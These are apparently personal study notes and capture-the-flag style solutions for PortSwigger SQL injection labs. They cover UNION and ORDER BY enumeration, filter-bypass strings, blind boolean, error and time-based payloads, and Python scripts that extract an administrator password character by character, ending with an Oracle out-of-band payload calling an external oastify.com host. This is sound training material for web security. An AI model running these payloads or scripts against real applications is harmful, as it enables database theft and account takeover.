# SQL Injection
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

## Select Data from information_schema

- All database which the user has access

```sql
select schema_name from information_schema.schemata;
```

```sql
+--------------------+
| SCHEMA_NAME        |
+--------------------+
| mysql              |
| information_schema |
| performance_schema |
| sys                |
| test               |
| joke               |
| joke_t             |
| joke_              |
| wp                 |
+--------------------+
```

- All tables which the user has access

```sql
select table_name from information_schema.tables where table_schema="test"
# or
# select table_name from information_schema.tables where table_schema=database()
```

```sql
+------------+
| TABLE_NAME |
+------------+
| client     |
| user       |
+------------+
```

- All columns from a specific table

```sql
select column_name from information_schema.columns where table_schema=database() and table_name="user";
```

```sql
+-------------+
| COLUMN_NAME |
+-------------+
| id          |
| name        |
| email       |
+-------------+
```

- Simple select

```sql
select name from user;
```

```sql
+-------+
| name  |
+-------+
| Ho    |
| Alfa  |
| beta  |
| jolfa |
+-------+
```

```sql
select * from client
```

```sql
Empty set (0.00 sec)
```

## **SQL injection UNION attacks**

When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the `UNION` keyword can be used to retrieve data from other tables within the database. This results in an SQL injection UNION attack.

## ORDER BY

```sql
mysql> select * from user ORDER BY 1;
+------+-------+----------------+
| id   | name  | email          |
+------+-------+----------------+
|    1 | Ho    | test@gmail.com |
|    2 | Alfa  | alfa@gmail.com |
|    3 | beta  | beta@gmail.com |
|    4 | jolfa | j@gmail.com    |
+------+-------+----------------+
```

```sql
mysql> select * from user ORDER BY 2;
+------+-------+----------------+
| id   | name  | email          |
+------+-------+----------------+
|    2 | Alfa  | alfa@gmail.com |
|    3 | beta  | beta@gmail.com |
|    1 | Ho    | test@gmail.com |
|    4 | jolfa | j@gmail.com    |
+------+-------+----------------+
```

- Number must be equal or less than number of columns.

```sql
mysql> select * from user ORDER BY 4;
ERROR 1054 (42S22): Unknown column '4' in 'order clause'
```

## UNION OPERATOR

The UNION keyword lets you execute one or more additional SELECT queries and append the results to the original query.

For a `UNION` query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

```sql
select * from user union select * from client union select 1,2,3
```

```sql
+------+-------+----------------+
| id   | name  | email          |
+------+-------+----------------+
|    1 | Ho    | test@gmail.com |
|    2 | Alfa  | alfa@gmail.com |
|    3 | beta  | beta@gmail.com |
|    4 | jolfa | j@gmail.com    |
|    1 | 2     | 3              |
+------+-------+----------------+
```

Union select with different number of coulmns

```sql
select * from user union select 1,2,3,4;
```

```sql
#output
ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

## ****Determining the number of columns required in an SQL injection UNION attack****

1. ORDER BY

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
# or
' ORDER BY 1#
' ORDER BY 2#
' ORDER BY 3#
```

1. UNION SELECT

```sql
' union null-- 
' union null#
' union null,null,null--
```

If the number of nulls does not match the number of columns, the database returns an error, such as:

```sql
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```

Again, the application might actually return this error message, or might just return a generic error or no results. When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column.

> The reason for using `NULL` as the values returned from the injected `SELECT` query is that the data types in each column must be compatible between the original and the injected queries. Since `NULL` is convertible to every commonly used data type, using `NULL` maximizes the chance that the payload will succeed when the column count is correct.
> 

- Union select on Oracel

```sql
' UNION SELECT NULL from dual--
```

On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.

There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`

## ****Finding columns with a useful data type in an SQL injection UNION attack****

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

- If the data type of a column is not compatible with string data, the injected query will cause a database error, such as:

```sql
Conversion failed when converting the varchar value 'a' to data type int.
```

If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.

## Concatinate

- `concat` concatinate toghether multiple strings to single string

```sql
select concat(name,"~~~",email) from user;
```

```sql
+--------------------------+
| concat(name,"~~~",email) |
+--------------------------+
| Ho~~~test@gmail.com      |
| Alfa~~~alfa@gmail.com    |
| beta~~~beta@gmail.com    |
| jolfa~~~j@gmail.com      |
+--------------------------+
```

- `group_concat` concatenate data from multiple rows into one field

```sql
select group_concat(name,"~~~",email) from user;
```

```sql
+-------------------------------------------------------------------------------------+
| group_concat(name,"~~~",email)                                                      |
+-------------------------------------------------------------------------------------+
| Ho~~~test@gmail.com,Alfa~~~alfa@gmail.com,beta~~~beta@gmail.com,jolfa~~~j@gmail.com |
+-------------------------------------------------------------------------------------+
```

## ****Avoiding Whitespace****

```sql
' or 1=1#
# equal
"/**/or/**/1=1#
```

## Using hex of string

```sql
mysql> select * from user where name='Alfa';
+------+------+----------------+
| id   | name | email          |
+------+------+----------------+
|    2 | Alfa | alfa@gmail.com |
+------+------+----------------+
1 row in set (0.00 sec)

mysql> select * from user where name=0x416c6661;
+------+------+----------------+
| id   | name | email          |
+------+------+----------------+
|    2 | Alfa | alfa@gmail.com |
+------+------+----------------+
1 row in set (0.00 sec)
```

- Convert string to hex in Linux bash via `xxd`

```bash
echo -n Alfa| xxd -ps
```

## MySQL IF/CASE Condition

- IF

```sql
select if(2>1,"True","False");
```

```sql
+------------------------+
| if(2>1,"True","False") |
+------------------------+
| True                   |
+------------------------+
```

- Case

```sql
mysql> select name, case when name='Alfa' then 'True' else '-' end from user;
+-------+------------------------------------------------+
| name  | case when name='Alfa' then 'True' else '-' end |
+-------+------------------------------------------------+
| Ho    | -                                              |
| Alfa  | True                                           |
| beta  | -                                              |
| jolfa | -                                              |
+-------+------------------------------------------------+
```

## **MySQL SUBSTRING Functions**

- Syntax
    - **Note:** The [SUBSTR()](https://www.w3schools.com/SQl/func_mysql_substr.asp) and [MID()](https://www.w3schools.com/SQl/func_mysql_mid.asp) functions equals to the SUBSTRING() function.

```sql
SUBSTRING(string, start, length)
SUBSTR(string, start, length)
MID(string, start, length)
```

```sql
mysql> select substring('rick',1,1);
+-----------------------+
| substring('rick',1,1) |
+-----------------------+
| r                     |
+-----------------------+
1 row in set (0.00 sec)

mysql> select substr('rick',1,1);
+--------------------+
| substr('rick',1,1) |
+--------------------+
| r                  |
+--------------------+
1 row in set (0.00 sec)

mysql> select mid('rick',1,1);
+-----------------+
| mid('rick',1,1) |
+-----------------+
| r               |
+-----------------+
1 row in set (0.00 sec)
```

## ASCII

Return the ASCII value of the **first** character.

```sql
mysql> SELECT ASCII('RICK');
+---------------+
| ASCII('RICK') |
+---------------+
|            82 |
+---------------+
1 row in set (0.00 sec)

mysql> SELECT ASCII('R');
+------------+
| ASCII('R') |
+------------+
|         82 |
+------------+
1 row in set (0.00 sec)
```

- ASCII table

```sql
Dec	Hex	Oct	Html	Char
0	0	000		NUL
1	1	001		SOH
2	2	002		STX
3	3	003		ETX
4	4	004		EOT
5	5	005		ENQ
6	6	006		ACK
7	7	007		BEL
8	8	010		BS
9	9	011		TAB
10	A	012		LF
11	B	013		VT
12	C	014		FF
13	D	015		CR
14	E	016		SO
15	F	017		SI
16	10	020		DLE
17	11	021		DC1
18	12	022		DC2
19	13	023		DC3
20	14	024		DC4
21	15	025		NAK
22	16	026		SYN
23	17	027		ETB
24	18	030		CAN
25	19	031		EM
26	1A	032		SUB
27	1B	033		ESC
28	1C	034		FS
29	1D	035		GS
30	1E	036		RS
31	1F	037		US
32	20	040	&#32;	Space
33	21	041	&#33;	!
34	22	042	&#34;	\"
35	23	043	&#35;	#
36	24	044	&#36;	$
37	25	045	&#37;	%
38	26	046	&#38;	&
39	27	047	&#39;	'
40	28	050	&#40;	(
41	29	051	&#41;	)
42	2A	052	&#42;	*
43	2B	053	&#43;	+
44	2C	054	&#44;	,
45	2D	055	&#45;	-
46	2E	056	&#46;	.
47	2F	057	&#47;	/
48	30	060	&#48;	0
49	31	061	&#49;	1
50	32	062	&#50;	2
51	33	063	&#51;	3
52	34	064	&#52;	4
53	35	065	&#53;	5
54	36	066	&#54;	6
55	37	067	&#55;	7
56	38	070	&#56;	8
57	39	071	&#57;	9
58	3A	072	&#58;	:
59	3B	073	&#59;	;
60	3C	074	&#60;	<
61	3D	075	&#61;	=
62	3E	076	&#62;	>
63	3F	077	&#63;	?
64	40	100	&#64;	@
65	41	101	&#65;	A
66	42	102	&#66;	B
67	43	103	&#67;	C
68	44	104	&#68;	D
69	45	105	&#69;	E
70	46	106	&#70;	F
71	47	107	&#71;	G
72	48	110	&#72;	H
73	49	111	&#73;	I
74	4A	112	&#74;	J
75	4B	113	&#75;	K
76	4C	114	&#76;	L
77	4D	115	&#77;	M
78	4E	116	&#78;	N
79	4F	117	&#79;	O
80	50	120	&#80;	P
81	51	121	&#81;	Q
**82	52	122	&#82;	R**
83	53	123	&#83;	S
84	54	124	&#84;	T
85	55	125	&#85;	U
86	56	126	&#86;	V
87	57	127	&#87;	W
88	58	130	&#88;	X
89	59	131	&#89;	Y
90	5A	132	&#90;	Z
91	5B	133	&#91;	[
92	5C	134	&#92;	\
93	5D	135	&#93;	]
94	5E	136	&#94;	^
95	5F	137	&#95;	_
96	60	140	&#96;	`
97	61	141	&#97;	a
98	62	142	&#98;	b
99	63	143	&#99;	c
100	64	144	&#100;	d
101	65	145	&#101;	e
102	66	146	&#102;	f
103	67	147	&#103;	g
104	68	150	&#104;	h
105	69	151	&#105;	i
106	6A	152	&#106;	j
107	6B	153	&#107;	k
108	6C	154	&#108;	l
109	6D	155	&#109;	m
110	6E	156	&#110;	n
111	6F	157	&#111;	o
112	70	160	&#112;	p
113	71	161	&#113;	q
114	72	162	&#114;	r
115	73	163	&#115;	s
116	74	164	&#116;	t
117	75	165	&#117;	u
118	76	166	&#118;	v
119	77	167	&#119;	w
120	78	170	&#120;	x
121	79	171	&#121;	y
122	7A	172	&#122;	z
123	7B	173	&#123;	{
124	7C	174	&#124;	|
125	7D	175	&#125;	}
126	7E	176	&#126;	~
127	7F	177	&#127;	DEL
```

## Bypass blacklist

- SELECT

```sql
SeLeCt
%00SELECT
SELSELECTECT
%53%45%4c%45%43%54
%2553%2545%254c%2545%2543%2554
SEL/**/ECT
```

## Blind SQL injection

Blind SQL injection arises when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

With blind SQL injection vulnerabilities, many techniques such as `UNION` attacks, are not effective because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.

1. Boolean based blind → return 1 or 0
2. Time based blind → make a delay if query be ture

**Lab** - [https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

**Solution:**

I have a tracking id in cookeis like this :TrackingId=NqZivwgKPtLKDW0x;

I can see “welcome back!” in home page, if this trakingId be correct, otherwise nothing.

Now I add a boolean condition next of tracking id:

```sql
TrackingId=NqZivwgKPtLKDW0x' and 1=1-- 
```

again I see “Welcome back!”, then I want to test another case:

```sql
TrackingId=NqZivwgKPtLKDW0x' and 1=2--
```

but this time nothing.

so that’s mean there is a sqli. first I need to know length of password. so I wrote this:

```sql
TrackingId=NqZivwgKPtLKDW0x' and 1<(select length(password) from user where username='administrator')--
```

again I see “Welcome back!”, so clearly, the length is greater than of number one. after play with number, I found out the length is 20

```sql
TrackingId=NqZivwgKPtLKDW0x' and 20=(select length(password) from user where username='administrator')--
```

Now I need to write a script to extract 20 chars of administrator’s password.

```python
import requests
from bs4 import BeautifulSoup as BS
import re
from itertools import chain

def _check_bool(query):

    cookies = {
            "TrackingId":f"NqZivwgKPtLKDW0x' and {query}",
            "session":"kfZso9yB7U0rwIVOktJhRv4yTNSSnadv",
            }
    req= s.get('https://0a7100350360f9e3c0fa0764000900a7.web-security-academy.net', cookies=cookies)

    response = BS(req.text,'html.parser')
    target = str(response)
    pattern = r"Welcome"

    res= re.search(pattern,target)

    if res:
        return True
    else:
        return False

def _dump_char():

    # ASCII CHAR a-z ==> 97-122
    # ASCII 0-9 => 48-57
    # ASCII CHAR _ => 95
    # ASCII CHAR , => 44
    result = ''

    dump_length = 22

    print(dump_length, end="\n", flush=True)

    for l in range(1, dump_length+1):
        ascii_chars = chain(range(97, 123),
                range(48, 58), range(95, 96), range(44, 45))
        for char in ascii_chars:
            query= f"{char}=ascii(substr((select password from users where username='administrator'),{l},1))--"
            res = _check_bool(query)
            if res:
                print(chr(char), end="", flush=True)
                result = result + chr(char)
                break

    print("\n")
    return result

with requests.Session () as s:
    print(_dump_char())
```

- **LAB2**: [https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

**My Solution:** 

For this challenge I need to find an error condition. First I test it:

```sql
TrackingId=w9jrPJv9nbvMV3Jz' and 1=2--
```

Nothing, test another case:

```sql
TrackingId=w9jrPJv9nbvMV3Jz' and 1=TO_CAHR(1/0)--
```

Boom Error. (Database is Oracel).

Now I need to know length of database:

```sql
TrackingId=w9jrPJv9nbvMV3Jz' and 1=(SELECT CASE WHEN ((select length(password) from users where username='administrator')=21) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--
```

Nothing, test another case:

```sql
TrackingId=w9jrPJv9nbvMV3Jz' and 1=(SELECT CASE WHEN ((select length(password) from users where username='administrator')=20) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--
```

Boom Error, Database length is 20.

Now I need to extract password from database. 

```sql
GET / HTTP/1.1
Host: 0a0f00810350486bc022179800ff00c7.web-security-academy.net
Cookie: TrackingId=w9jrPJv9nbvMV3Jz' and 1=(SELECT CASE WHEN ('h'=substr((select password from users where username='administrator'),1,1)) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--; session=f17ws8nSrFNcRFkM1JVdwqvXyBcc0bm0
Sec-Ch-Ua: "Google Chrome";v="93", " Not;A Brand";v="99", "Chromium";v="93"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0f00810350486bc022179800ff00c7.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fa;q=0.8
Connection: close
```

The first char of password is h.

Now I run this exploit:

```sql
import requests
from bs4 import BeautifulSoup as BS
import re
from itertools import chain

def _check_bool(query):

    cookies = {
            "TrackingId":f"w9jrPJv9nbvMV3Jz' and {query}",
            "session":"kfZso9yB7U0rwIVOktJhRv4yTNSSnadv",
            }
    req= s.get('https://0a5800940343c617c055020700970091.web-security-academy.net/', cookies=cookies)

    if req.status_code >= 500:
        return True
    else:
        return False

def _dump_char():

    # ASCII CHAR a-z ==> 97-122
    # ASCII CHAR A-Z ==> 65-90
    # ASCII 0-9 => 48-57
    # ASCII CHAR _ => 95
    # ASCII CHAR , => 44
    result = ''

    dump_length = 22

    print(dump_length, end="\n", flush=True)

    for l in range(1, dump_length+1):
        ascii_chars = chain(range(97, 123),
                range(48, 58), range(95, 96), range(44, 45))
        for char in ascii_chars:
            query=f"1=(SELECT CASE WHEN ({char}=ASCII(substr((select password from users where username='administrator'),{l},1))) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--"
            res = _check_bool(query)
            if res:
                print(chr(char), end="", flush=True)
                result = result + chr(char)
                break

    print("\n")
    return result

with requests.Session () as s:
    print(_dump_char())
```

- **LAB:Blind SQL injection with time delays and information retrieval
url:**[https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

Solution:

First I need to know what is the sql type, after tests, I found this challenge using Postgresql.

```sql
Cookie: TrackingId=zbDwYeFRnryEXDOp' || pg_sleep(10)--;
```

Now I need the length of password: it’s 20

```sql
GET / HTTP/1.1
Host: 0a6e001c039be6c6c095349f007700fa.web-security-academy.net
Cookie: TrackingId=zbDwYeFRnryEXDOp' || (SELECT CASE WHEN ((select length(password) from users where username='administrator')=20) THEN pg_sleep(3) ELSE pg_sleep(0) END)--; session=u1wC4Yp3TnA2gz91WYB54O2NDk6T1H4M
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua: "Google Chrome";v="93", " Not;A Brand";v="99", "Chromium";v="93"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fa;q=0.8
Connection: close
```

let’s find a query to fetch password:

```sql
Cookie: TrackingId=zbDwYeFRnryEXDOp' || (SELECT CASE WHEN ('b'=substr((select password from users where username='administrator'),5,1)) THEN pg_sleep(3) ELSE pg_sleep(0) END)--;
```

Now With a python code I can fetch all chars of password:

```sql
import requests
from itertools import chain

def _check_bool(query):
    cookies = {
            "TrackingId":f"zbDwYeFRnryEXDOp' || {query}",
            "session":"u1wC4Yp3TnA2gz91WYB54O2NDk6T1H4M",
            }

    req = s.get("https://0a6e001c039be6c6c095349f007700fa.web-security-academy.net", cookies=cookies)

    if req.elapsed.total_seconds() >= 3:
        return True
    else:
        return False

def _dump_char():
    result=''
    dump_length=21

    for l in range(1, dump_length+1):
        ascii_chars = chain(range(97,123),range(48,58))
        for char in ascii_chars:
            query = f"(SELECT CASE WHEN ({char}=ascii(substr((select password from users where username='administrator'),{l},1))) THEN pg_sleep(5) ELSE pg_sleep(0) END)--"

            res = _check_bool(query)
            if res:
                print(chr(char), end="", flush=True)
                result = result + chr(char)
                break

    print("\n")
    return result

with requests.Session() as s:
    _dump_char()
```

****Lab: Blind SQL injection with out-of-band data exfiltration****

url: [https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

This solution works for Oracel SQL

```sql
+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//jsfl9x72zpfgcjxyr6txhc75awgm4b.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```
